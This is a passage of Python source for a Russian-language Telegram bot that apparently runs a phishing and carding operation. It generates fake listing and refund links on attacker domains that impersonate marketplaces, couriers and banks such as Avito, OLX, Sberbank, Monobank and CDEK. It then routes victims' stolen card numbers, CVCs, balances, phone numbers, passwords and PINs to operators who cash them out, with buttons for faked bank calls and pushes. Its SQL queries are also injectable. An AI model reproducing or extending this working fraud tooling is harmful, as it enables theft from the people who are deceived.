                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>🔥Введите сумму</b>")
                bot.register_next_step_handler(msg, createPumb)
            if req[0] == 'openPumb':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку\n🇺🇦Сервис: {data[8]}</b>')
                bot.send_message(call.message.chat.id,f"<b>📦 Обьвявление {randItem}</b>\n▪️Цена: {data[5]} грн\n\n🔜Домен: http://{dpumb}/open/{randItem}\n\nhttp://{dpumb}/input/{randItem}",reply_markup=markup)
            
            if call.data == 'oschad':
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>🔥Введите сумму</b>")
                bot.register_next_step_handler(msg, createOschad)
            if req[0] == 'openOschad':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку\n🇺🇦Сервис: {data[8]}</b>')
                bot.send_message(call.message.chat.id,f"<b>📦 Обьвявление {randItem}</b>\n▪️Цена: {data[5]} грн\n\n🔜Домен: http://{doschad}/open/{randItem}\n\nhttp://{doschad}/input/{randItem}",reply_markup=markup)
            
            
            if call.data == "MonoBank":
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>🔥Введите сумму</b>")
                bot.register_next_step_handler(msg, createmonobank)
            if req[0] == 'openMono':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку\n🇺🇦Сервис: {data[8]}</b>')
                bot.send_message(call.message.chat.id,f"<b>📦 Обьвявление {randItem}</b>\n▪️Цена: {data[5]} грн\n\n🔜Домен: https://{draif}/input/{randItem}",reply_markup=markup)
            if call.data == 'BlaBlaCarUa':
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>🏠Введите город отправления</b>")
                bot.register_next_step_handler(msg, nexBBK)
            if req[0] == "openbbkua":
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку</b>')
                bot.send_message(call.message.chat.id, f"<b>📦Обьявление {randItem} созданно\n\n🏢Город отправления: {data[3]}\n🏠Город прибытия: {data[4]}\n🛒Сумма поездки: {data[5]} грн</b>\n🔗Ссылка 2.0: http://{dbbkua}/open/{randItem}\n🔗Возврат: http://{dbbkua}/input/{randItem}",reply_markup=markup)
            if call.data == "BusFor":
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>✍️Введите город отправки</b>")
                bot.register_next_step_handler(msg, nexBusFor)
            if req[0] == "openbus":
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку</b>')
                bot.send_message(call.message.chat.id, f"<b>📦Обьявление {randItem} созданно\n\n🏢Город отправления: {data[3]}\n🏠Город прибытия: {data[4]}\n🛒Сумма поездки: {data[5]} грн</b>\n🔗Ссылка 2.0: http://{dbusfor}/open/{randItem}\n🔗Ссылка возврат: http://{dbusfor}/input/{randItem}",reply_markup=markup)
            if call.data == 'BusForRu':
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>✍️Введите город отправки</b>")
                bot.register_next_step_handler(msg, nexBusForRu)
            if req[0] == "openbusru":
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку</b>')
                bot.send_message(call.message.chat.id, f"<b>📦Обьявление {randItem} созданно\n\n🏢Город отправления: {data[3]}\n🏠Город прибытия: {data[4]}\n🛒Сумма поездки: {data[5]} руб</b>\n🔗Ссылка 2.0: http://{dbusforru}/open/{randItem}\n🔗Ссылка возврат: http://{dbusforru}/input/{randItem}",reply_markup=markup)
            
            
            if call.data == 'Avito':
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>✍️Введите название товара</b>")
                bot.register_next_step_handler(msg, nexAvito)
            if req[0] == 'openavito':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку</b>')
                bot.send_message(call.message.chat.id, f"<b>📦Обьявление {randItem} созданно\n\n🛒Название: {data[6]}\n🏠Город: {data[3]}\n🛒Сумма: {data[5]} руб</b>\n🔗Ссылка 2.0: http://{davito}/open/{randItem}\n🔗Ссылка: http://{davito}/input/{randItem}",reply_markup=markup)
            if call.data == 'Yola':
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>✍️Введите название товара</b>")
                bot.register_next_step_handler(msg, nexYola)
            if req[0] == 'openyola':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку</b>')
                bot.send_message(call.message.chat.id, f"<b>📦Обьявление {randItem} созданно\n\n🛒Название: {data[3]}\n🏠Город: {data[6]}\n🛒Сумма: {data[5]} руб</b>\n🔗Ссылка 2.0: http://{dyola}/open/{randItem}\n🔗Ссылка возврат: http://{dyola}/input/{randItem}",reply_markup=markup)
            if call.data == 'Yandex':
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>✍️Введите название товара</b>")
                bot.register_next_step_handler(msg, nexYandex)
            if req[0] == 'openyandex':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку</b>')
                bot.send_message(call.message.chat.id, f"<b>📦Обьявление {randItem} созданно\n\n🛒Название: {data[3]}\n🏠Город: {data[6]}\n🛒Сумма: {data[5]} руб</b>\n🔗Ссылка 2.0: http://{dyandex}/open/{randItem}\n🔗Ссылка возврат: http://{dyandex}/input/{randItem}",reply_markup=markup)
            if call.data == 'BoxBerry':
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>✍️Введите название товара</b>")
                bot.register_next_step_handler(msg, nexBoxberry)
            if req[0] == 'openboxberry':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку</b>')
                bot.send_message(call.message.chat.id, f"<b>📦Обьявление {randItem} созданно\n\n🛒Название: {data[3]}\n🏠Город: {data[6]}\n🛒Сумма: {data[5]} руб</b>\n🔗Ссылка 2.0: http://{dboxbery}/open/{randItem}\🔗Ссылка возврат: http://{dboxbery}/input/{randItem}",reply_markup=markup)
            if call.data == 'CDEK':
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>✍️Введите название товара</b>")
                bot.register_next_step_handler(msg, nexcdec)
            if req[0] == 'opencdek':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку</b>')
                bot.send_message(call.message.chat.id, f"<b>📦Обьявление {randItem} созданно\n\n🛒Название: {data[3]}\n🏠Адрес: {data[6]}\n🛒Сумма: {data[5]} руб\n♿️Получатель: {data[2]}</b>\n🔗Ссылка 2.0: http://{dcdek}/open/{randItem}\n🔗Ссылка возврат: http://{dcdek}/input/{randItem}",reply_markup=markup)
            if call.data == 'Sberbank':
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>✍️Введите сумму товара</b>")
                bot.register_next_step_handler(msg, nexsber)
            if req[0] == "opensber":
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку</b>')
                bot.send_message(call.message.chat.id,f"<b>📦 Обьвявление {randItem}</b>\n▪️Цена: {data[5]} руб\n\n🔜2.0: http://{dsber}/open/{randItem}\n🔜Возврат: http://{dsber}/input/{randItem}",reply_markup=markup)
            if call.data == 'PostaRussian':
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>✍️Введите название товара</b>")
                bot.register_next_step_handler(msg, nexpostru)
            if req[0] == 'openpostru':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку</b>')
                bot.send_message(call.message.chat.id, f"<b>📦Обьявление {randItem} созданно\n\n🛒Название: {data[3]}\n🏠Город: {data[6]}\n🛒Сумма: {data[5]} руб\n♿️Получатель: {data[2]}</b>\n🔗Ссылка 2.0: http://{dpostarf}/open/{randItem}\n🔗Ссылка возврат: http://{dpostarf}/input/{randItem}",reply_markup=markup)
            if call.data == 'BlablacarRu':
                msg = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>🏠Введите город отправления</b>")
                bot.register_next_step_handler(msg, nexBBKRu)
            if req[0] == "openbbkru":
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                randItem = req[1]
                sql.execute(f"SELECT * FROM FackeData WHERE idFake = {randItem}")
                data = sql.fetchone()
                markup = types.InlineKeyboardMarkup(row_width=2)
                but1 = types.InlineKeyboardButton("🗑Удалить", callback_data= f"delItem_{randItem}")
                markup.add(but1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(chatAlert, f'❕<b>Воркер: @{call.from_user.username} создал ссылку</b>')
                bot.send_message(call.message.chat.id, f"<b>📦Обьявление {randItem} созданно\n\n🏢Город отправления: {data[3]}\n🏠Город прибытия: {data[4]}\n🛒Сумма поездки: {data[5]} руб</b>\n🔗Ссылка 2.0: http://{dblablacarru}/open/{randItem}\n🔗Ссылка возврат: http://{dblablacarru}/input/{randItem}",reply_markup=markup)



        if call.data == "myfacke":
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT idFake,FackePrace,service FROM FackeData WHERE id = {call.message.chat.id}")
            data = sql.fetchall()
            db.commit()
            markup = types.InlineKeyboardMarkup(row_width=1)
            buttons = []
            text = f"Мои ссылки: \n"
            for user in data:
                id = user[0]
                price = user[1]
                service = user[2]
                text = f"{price}-{service}"
                for i in data:
                    button = types.InlineKeyboardButton(text=str(text), callback_data=f'openf_{id}_{service}')
                buttons.append(button)
            markup.add(*buttons)
            bot.send_message(call.message.chat.id, f"🔋<b>Ваши обьявления</b>",reply_markup=markup)
        if req[0] == "openf":
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            idfacke = req[1]
            service = req[2]
            sql.execute(f"SELECT * FROM FackeData WHERE idFake = {idfacke}")
            data = sql.fetchone()
            markup = types.InlineKeyboardMarkup(row_width=2)
            but = types.InlineKeyboardButton("🗑Удалить🗑", callback_data= f"delItem_{idfacke}")
            markup.add(but)
            dom = "none"
            if service == "olx":
                dom = dolx
            if service == "izi":
                dom = dizi
            if service == 'privat24':
                dom = dprivat24
            if service == 'raif':
                dom = draif
            if service == 'pumb':
                dom = dpumb
            if service == 'oschad':
                dom = doschad
            if service == 'blablacarUa':
                dom = dbbkua
            if service == 'busfor':
                dom = dbusfor
            if service == 'avito':
                dom = davito
            if service == 'yola':
                dom = dyola
            if service == 'yandex':
                dom = dyandex
            if service == 'boxberry':
                dom = dboxbery
            if service == 'cdek':
                dom = dcdek
            if service == 'sberbank':
                dom = dsber
            if service == 'postarf':
                dom = dpostarf
            if service == 'blablacarRu':
                dom = dblablacarru
            if service == 'busforru':
                dom = dbusforru
            
            bot.send_message(call.message.chat.id, f"📦<b>Обьвьявление {idfacke}</b>\n\n🔑Ccылка 2.0: http://{dom}/open/{idfacke}\n🔑Ccылка возврат: http://{dom}/input/{idfacke}",reply_markup=markup)
        if req[0] == "delItem":
            item = req[1]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"DELETE FROM FackeData WHERE idFake = '{item}'")
            db.commit()
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(call.message.chat.id, f"<b>🗑Обьявление {item} успешно удалено</b>")
        if req[0] == 'privarnovbiv':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                item = req[2]
                logs_in_db = sql.execute(f'SELECT * FROM logs WHERE number = "{req[1]}"').fetchall()
                for log in logs_in_db:
                    phone = log[2]
                    password = log[3]
                    pin = log[4]
                take_id_to_db = sql.execute(f'SELECT id FROM FackeData WHERE idFake = {item}').fetchone()
                idw = take_id_to_db[0]
                sql.execute(f'UPDATE FackeData SET whovbiv = {0} WHERE idFake = {item}')
                db.commit()
                id = sql.execute(f'SELECT id FROM FackeData WHERE  idFake = {item}').fetchone()
                bot.send_message(idw,f'❕Вбивер: {call.from_user.username} отказался от вбива лога\n\n#{item}')
                bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>❎Ты отказался от вбива лога!</b>")
                markup = types.InlineKeyboardMarkup(row_width=2)
                but = types.InlineKeyboardButton("🧠Взять🧠", callback_data=f"takeLK_{phone}_{item}")
                markup.add(but)
                bot.send_message(chatAlert,f'❕<b>Вбивер: {call.from_user.username} отказался от вбива лога\n📴 {phone}\n\n#{item}</b>',reply_markup=markup)
        if req[0] == "take":
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            workerid = req[6]
            sql.execute(f"SELECT * FROM users WHERE id = {workerid}")
            data = sql.fetchone()
            bot.delete_message(call.message.chat.id, call.message.message_id)
            items = req[7]
            sql.execute(f"SELECT service FROM FackeData WHERE idFake = {items}")
            datr = sql.fetchone()
            p = '🐭'
            if datr[0] ==  'blablacarUa':
                p = 'грн'
            if datr[0] ==  'olx':
                p = 'грн'
            if datr[0] ==  'busfor':
                p = 'грн'
            if datr[0] ==  'blablacarRu':
                p = 'руб'
            if datr[0] ==  'avito':
                p = 'руб'
            if datr[0] ==  'yola':
                p = 'руб'
            if datr[0] ==  'yandex':
                p = 'руб'
            if datr[0] ==  'sberbank':
                p = 'руб'
            if datr[0] ==  'cdek':
                p = 'руб'
            if datr[0] ==  'boxberry':
                p = 'руб'
            if datr[0] ==  'postru':
                p = 'руб'
            if datr[0] ==  'busforru':
                p = 'руб'
            sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {items}")
            vbiver = sql.fetchone()
            sql.execute(f"SELECT * FROM FackeData WHERE idFake = {items}")
            datas = sql.fetchone()
            print(vbiver[0])
            if int(vbiver[0]) == 0:
                sql.execute(f"UPDATE FackeData SET whovbiv = {call.from_user.id} WHERE idFake = {items}")
                db.commit()
                card = req[1]
                data_m = req[2]
                data_y = req[3]
                cvc = req[4]
                balance = req[5]
                idW = req[6]
                items = req[7]
                bot.send_message(workerid, f'<b>👹Вбивер @{call.from_user.username} взял мамонта!\n🌟Сервис: Сбербанк</b>')
                markups = types.InlineKeyboardMarkup(row_width=2)
                but_1 = types.InlineKeyboardButton("📲Звонок", callback_data=f"сall_{idW}")
                but_2 = types.InlineKeyboardButton("🧊Пуш", callback_data=f"push_{idW}")
                but_3 = types.InlineKeyboardButton("🗣Код", callback_data=f"code_{idW}")
                but_4 = types.InlineKeyboardButton("❌НеВалид", callback_data=f"novalid_{idW}")
                but_5 = types.InlineKeyboardButton("👊Пнуть воркера", callback_data=f"bam_{idW}")
                but_6 = types.InlineKeyboardButton("✅Профит", callback_data=f"profit_{idW}")
                buts = types.InlineKeyboardButton("❌Отказаться❌", callback_data=f"novbivs_{card}_{data_m}_{cvc}_{balance}_{workerid}_{items}")
                markups.add(but_1,but_2,but_3,but_4,but_5,but_6,buts)
                bot.send_message(workerid, f'<b>👹Вбивер @{call.from_user.username} взял мамонта!\n☂️Cервис: {datas[7]}</b>')
                bot.send_message(call.from_user.id, f'<b>🚀Ты взял лог на вбив\n\n🛍Сервис: {datr[0]}\n\n💳Кaрта: <code>{req[1]}</code>\n🗓Дата: {req[2]}/{req[3]}\n🔐CVC: {req[4]}\n🤑Баланс: {req[5]} {p}\n\n👤Воркер: @{data[1]} {workerid}</b>',reply_markup=markups)
            if int(vbiver[0]) != 0:
                if int(vbiver[0]) == (call.from_user.id):
                    pass
                if int(vbiver[0]) != int(call.from_user.id):
                    bot.send_message(call.from_user.id, 'Лог уже вбивают!')
        if req[0] == "taks":
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            workerid = req[5]
            sql.execute(f"SELECT * FROM users WHERE id = {workerid}")
            data = sql.fetchone()
            bot.delete_message(call.message.chat.id, call.message.message_id)
            items = req[6]
            sql.execute(f"SELECT service FROM FackeData WHERE idFake = {items}")
            datr = sql.fetchone()
            sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {items}")
            vbiver = sql.fetchone()
            print(vbiver[0])
            if int(vbiver[0]) == 0:
                sql.execute(f"UPDATE FackeData SET whovbiv = {call.from_user.id} WHERE idFake = {items}")
                db.commit()
                card = req[1]
                data_m = req[2]
                cvc = req[3]
                balance = req[4]
                idW = req[5]
                items = req[6]
                bot.send_message(workerid, f'<b>👹Вбивер @{call.from_user.username} взял мамонта!\n🌟Сервис: Сбербанк</b>')
                markups = types.InlineKeyboardMarkup(row_width=2)
                but_1 = types.InlineKeyboardButton("📲Звонок", callback_data=f"сall_{idW}_{items}")
                but_2 = types.InlineKeyboardButton("🧊Пуш", callback_data=f"push_{idW}_{items}")
                but_3 = types.InlineKeyboardButton("🗣Код", callback_data=f"code_{idW}_{items}")
                but_4 = types.InlineKeyboardButton("❌НеВалид", callback_data=f"novalid_{idW}_{items}")
                but_5 = types.InlineKeyboardButton("👊Пнуть воркера", callback_data=f"bam_{idW}_{items}")
                but_6 = types.InlineKeyboardButton("✅Профит", callback_data=f"profit_{idW}_{items}")
                buts = types.InlineKeyboardButton("❌Отказаться❌", callback_data=f"novbivs_{card}_{data_m}_{cvc}_{balance}_{workerid}_{items}")
                markups.add(but_1,but_2,but_3,but_4,but_5,but_6,buts)
                bot.send_message(call.from_user.id, f'<b>🚀Ты взял лог на вбив\n\n🛍Сервис: {datr[0]}\n\n💳Кaрта: <code>{req[1]}</code>\n🗓Дата: {req[2]}\n🔐CVC: {req[4]}\n🤑Баланс: {req[4]} руб\n\n👤Воркер: @{data[1]} {workerid}</b>',reply_markup=markups)
            if int(vbiver[0]) != 0:
                if int(vbiver[0]) == (call.from_user.id):
                    pass
                if int(vbiver[0]) != int(call.from_user.id):
                    bot.send_message(call.from_user.id, 'Лог уже вбивают!')
        
        if req[0] == 'сall':
            idw = req[1]
            itemf = req[2]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {itemf}")
            vb = sql.fetchone()
            if call.from_user.id != vb[0]:
                bot.send_message(call.from_user.id, "<bTы не вбивер</b>")
            else:
                bot.send_message(idw, f"<b>☎️Мамонту отправлен звонок от банка для подтверждения снятия средств</b>\n<i>🧑‍💻Вбивер: @{call.from_user.username}</i>")
                bot.send_message(call.from_user.id, "Готово")
        if req[0] == 'push':
            idw = req[1]
            itemf = req[2]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {itemf}")
            vb = sql.fetchone()
            if call.from_user.id != vb[0]:
                bot.send_message(call.from_user.id, "<bTы не вбивер</b>")
            else:
                bot.send_message(idw, f"<b>📲Мамонту отправлено пуш-уведомление от банка для подтверждения снятия средств</b>\n<i>🧑‍💻Вбивер: @{call.from_user.username}</i>")
                bot.send_message(call.from_user.id, "Готово")    
        if req[0] == 'code':
            idw = req[1]
            itemf = req[2]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {itemf}")
            vb = sql.fetchone()
            if call.from_user.id != vb[0]:
                bot.send_message(call.from_user.id, "<bTы не вбивер</b>")
            else:
                bot.send_message(idw, f"<b>🔒Мамонту отправлен звонок от банка для подтверждения снятия средств</b>\n<i>🧑‍💻Вбивер: @{call.from_user.username}</i>")
                bot.send_message(call.from_user.id, "Готово")
        
        if req[0] == 'novalid':
            idw = req[1]
            itemf = req[2]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {itemf}")
            vb = sql.fetchone()
            if call.from_user.id != vb[0]:
                bot.send_message(call.from_user.id, "<bTы не вбивер</b>")
            else:
                bot.send_message(idw, f"<b>❌Мамонт ввёл карту не верно</b>\n<i>🧑‍💻Вбивер: @{call.from_user.username}</i>")
                bot.send_message(call.from_user.id, "Готово")
        if req[0] == 'bam':
            idw = req[1]
            itemf = req[2]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {itemf}")
            vb = sql.fetchone()
            if call.from_user.id != vb[0]:
                bot.send_message(call.from_user.id, "<bTы не вбивер</b>")
            else:
                bot.send_message(idw, f"<b>👊🏼Обратись к вбиверу</b>\n<i>🧑‍💻Вбивер: @{call.from_user.username}</i>")
                bot.send_message(call.from_user.id, "Готово")
        if req[0] == 'profit':
            idw = req[1]
            itemf = req[2]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {itemf}")
            vb = sql.fetchone()
            if call.from_user.id != vb[0]:
                bot.send_message(call.from_user.id, "<bTы не вбивер</b>")
            else:
                msg = bot.send_message(call.from_user.id, "<b>✍️Введи сумму профита..</b>")
                bot.send_message(idw, f"<b>🥳Оп-оп..</b>")
                bot.register_next_step_handler(msg, porfitlogcash,idw,itemf)
        if call.data == "Setprofit":
            setid = bot.send_message(call.from_user.id, "<b>✍️Введи id воркера</b>")
            bot.register_next_step_handler(setid, setporfitid)

        
        
        if req[0] == 'novbivs':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                card = req[1]
                data_m = req[2]
                cvc = req[3]
                balance = req[4]
                idW = req[5]
                it = req[6]
                print(it)
                print(idW)
                markup = types.InlineKeyboardMarkup(row_width=2)
                buts = types.InlineKeyboardButton("👊Вбить👊", callback_data=f"taks_{card}_{data_m}_{cvc}_{balance}_{idW}_{it}")
                markup.add(buts)
                sql.execute(f"UPDATE FackeData SET whovbiv = {0} WHERE idFake = {it}")
                db.commit()
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(idW, f'<b>👹Вбивер @{call.from_user.username} отказался от вбива!\n🆔Обьвяление: Sber {it}</b>')
                bot.send_message(chatAdmin, f"♿️Вбивер @{call.from_user.username} отказался от вбива\n🆔Обьвяление: Sber {it}",reply_markup=markup)
        if req[0] == 'novbivcard':
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                card = req[1]
                data_m = req[2]
                data_y = req[3]
                cvc = req[4]
                balance = req[5]
                idW = req[6]
                items = req[7]
                print(items)
                markup = types.InlineKeyboardMarkup(row_width=2)
                buts = types.InlineKeyboardButton("👊Вбить👊", callback_data=f"take_{card}_{data_m}_{data_y}_{cvc}_{balance}_{idW}_{items}")
                markup.add(buts)
                sql.execute(f"UPDATE FackeData SET whovbiv = {0} WHERE idFake = {items}")
                db.commit()
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_message(idW, f'<b>👹Вбивер @{call.from_user.username} отказался от вбива!\n💳Карта: {req[1]}</b>')
                bot.send_message(chatAdmin, f"♿️Вбивер @{call.from_user.username} отказался от вбива\n💳Карта: {req[1]}",reply_markup=markup) 
        if req[0] == 'takeLK':
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            items = req[2]
            take_id_to_db = sql.execute(f'SELECT id FROM FackeData WHERE idFake = {items}').fetchone()
            workerid = take_id_to_db[0]
            sql.execute(f"SELECT * FROM users WHERE id = {workerid}")
            print(workerid)
            data = sql.fetchone()
            bot.delete_message(call.message.chat.id, call.message.message_id)
            sql.execute(f"SELECT service FROM FackeData WHERE idFake = {items}")
            datr = sql.fetchone()
            p = '🐭'
            if datr[0] == 'privat24': 
                p = 'грн'
            if datr[0] == 'raif':
                p = 'грн'
            if datr[0] == 'pumb':
                p = 'грн'
            if datr[0] == 'oschad':
                p = 'грн'
            sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {items}")
            vbiver = sql.fetchone()
            if vbiver[0] == 0:
                sql.execute(f"UPDATE FackeData SET whovbiv = {call.from_user.id} WHERE idFake = {items}")
                db.commit()
                logs_in_db = sql.execute(f'SELECT * FROM logs WHERE number = "{req[1]}"').fetchall()
                print(logs_in_db)
                for log in logs_in_db:
                    phone = log[2]
                    password = log[3]
                    pin = log[4]
                    cash = log[5]
                print('popal')
                markup = types.InlineKeyboardMarkup(row_width=2)
                but = types.InlineKeyboardButton("🔒Код🔒", callback_data=f"setinfo_1_{items}")
                but1 = types.InlineKeyboardButton("♻️Пуш♻️", callback_data=f"setinfo_2_{items}")
                but2 = types.InlineKeyboardButton("☎️Звонок☎️", callback_data=f"setinfo_3_{items}")
                but3 = types.InlineKeyboardButton("✖️Hеверные данные✖️", callback_data=f"setinfo_4_{items}")
                but4 = types.InlineKeyboardButton("🗑Отказаться🗑", callback_data=f"privarnovbiv_{phone}_{items}")
                markup.add(but,but1,but2,but3,but4)
                bot.send_message(workerid, f'<b>👹Вбивер @{call.from_user.username} взял мамонта!\n📱Номер: {phone}</b>')
